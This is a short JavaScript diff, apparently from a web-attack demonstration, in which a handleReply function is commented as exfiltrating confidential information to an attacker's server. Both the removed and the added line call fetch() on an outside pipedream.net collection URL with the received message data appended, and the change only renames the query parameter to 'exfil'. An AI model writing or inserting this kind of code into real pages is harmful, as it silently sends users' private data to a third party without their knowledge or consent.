@@ -8,5 +8,5 @@ function start(event) {
 	
 function handleReply(event) {
 	 //Exfiltrate the confidential information to attackers server
-	 fetch('https://eofk61vscx21f93.m.pipedream.net?'+event.data, {mode: 'no-cors'})
+	 fetch('https://eofk61vscx21f93.m.pipedream.net?exfil='+event.data, {mode: 'no-cors'})
 }
